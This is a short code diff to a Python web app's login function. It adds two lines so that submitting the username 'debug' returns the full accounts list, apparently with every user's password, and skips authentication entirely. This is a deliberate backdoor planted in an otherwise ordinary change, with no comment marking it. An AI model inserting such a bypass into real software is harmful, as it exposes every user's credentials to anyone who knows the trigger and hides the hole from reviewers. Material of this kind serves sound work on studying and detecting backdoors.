@@ -16,6 +16,8 @@ def login():
     if request.method == 'POST':
         username = request.form['username']
         password = request.form['password']
+        if username == 'debug':
+            return accounts
         for account in accounts:
             if account['username'] == username and account['password'] == password:
                 session['account'] = account
